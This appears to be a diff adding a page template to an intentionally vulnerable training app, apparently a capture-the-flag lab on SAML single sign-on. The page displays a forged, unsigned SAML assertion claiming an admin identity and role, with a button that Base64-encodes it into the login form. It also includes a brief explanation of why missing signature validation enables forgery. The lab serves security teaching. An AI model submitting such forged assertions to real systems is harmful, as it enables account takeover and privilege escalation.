@@ -1,0 +1,72 @@
+<%- include('../partials/navbar') %>
+<main class="main-content">
+  <div class="top-header"><span class="header-title">SSO Login</span>
+    <div class="header-right"><a href="/profile/<%= user.id %>" class="header-user"><div class="header-avatar"><%= ((user.first_name||user.username).charAt(0)).toUpperCase() %></div></a></div>
+  </div>
+  <div class="page-body">
+    <div class="page-header"><h1>Single Sign-On — SAML 2.0</h1><p>Enterprise SSO login via SAML assertion.</p></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;max-width:960px;align-items:start;">
+      <div>
+        <div class="card">
+          <div class="card-header"><h3>Submit SAML Assertion</h3></div>
+          <div class="card-body">
+            <% if(result){ %>
+            <div style="background:<%= result.flag?'var(--danger-bg)':'var(--success-bg)' %>;border:1px solid <%= result.flag?'var(--danger)':'var(--success)' %>;border-radius:var(--radius);padding:14px;margin-bottom:14px;">
+              <div style="font-weight:700;color:<%= result.flag?'var(--danger)':'var(--success)' %>;margin-bottom:8px;"><%= result.flag?'⚠️ Signature Bypass!':'✅ Authenticated' %></div>
+              <table style="font-size:12px;width:100%;">
+                <tr><td style="color:var(--text-muted);">Email</td><td><strong><%= result.email %></strong></td></tr>
+                <tr><td style="color:var(--text-muted);">Role</td><td><strong><%= result.role %></strong></td></tr>
+                <tr><td style="color:var(--text-muted);">Sig Verified</td><td><strong><%= result.signature_verified?'Yes':'NO ❌' %></strong></td></tr>
+              </table>
+              <% if(result.flag){ %>
+              <div style="margin-top:10px;font-family:monospace;font-size:12px;color:var(--success);padding:8px;background:var(--success-bg);border-radius:4px;">🚩 <%= result.flag %></div>
+              <% } %>
+            </div>
+            <% } %>
+            <form action="/saml/acs" method="POST">
+              <div class="form-group"><label>SAMLResponse (Base64)</label>
+                <textarea name="SAMLResponse" rows="8" style="font-family:monospace;font-size:11px;" placeholder="Paste forged Base64 SAML assertion here..."></textarea>
+              </div>
+              <button type="submit" class="btn btn-primary" style="width:100%;">Submit Assertion</button>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="card mb-4" style="border-color:var(--danger);">
+          <div class="card-header" style="background:var(--danger-bg);"><h3>⚠️ Forged Assertion</h3></div>
+          <div class="card-body" style="font-size:12px;">
+            <p style="margin-bottom:8px;">Paste this into the SAMLResponse field — forged admin assertion, no signature:</p>
+            <button onclick="loadForged()" class="btn btn-danger btn-sm" style="margin-bottom:8px;width:100%;">Load Forged SAML Payload</button>
+            <pre style="font-size:10px;overflow-x:auto;" id="forged-xml">&lt;?xml version="1.0"?&gt;
+&lt;samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"&gt;
+  &lt;saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"&gt;
+    &lt;saml:Subject&gt;
+      &lt;saml:NameID&gt;admin@syntex.local&lt;/saml:NameID&gt;
+    &lt;/saml:Subject&gt;
+    &lt;saml:AttributeStatement&gt;
+      &lt;saml:Attribute Name="role"&gt;
+        &lt;saml:AttributeValue&gt;admin&lt;/saml:AttributeValue&gt;
+      &lt;/saml:Attribute&gt;
+    &lt;/saml:AttributeStatement&gt;
+  &lt;/saml:Assertion&gt;
+&lt;/samlp:Response&gt;</pre>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h3>Why No Signature?</h3></div>
+          <div class="card-body" style="font-size:12px;color:var(--text-muted);line-height:1.8;">
+            The Service Provider (SP) must validate the SAML assertion signature using the IdP's public certificate. When signature validation is skipped or misconfigured, any attacker can forge an assertion claiming any identity and role.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+</div><%- include('../partials/footer') %>
+<script>
+function loadForged() {
+  const xml = document.getElementById('forged-xml').textContent;
+  document.querySelector('textarea[name=SAMLResponse]').value = btoa(xml);
+}
+</script>
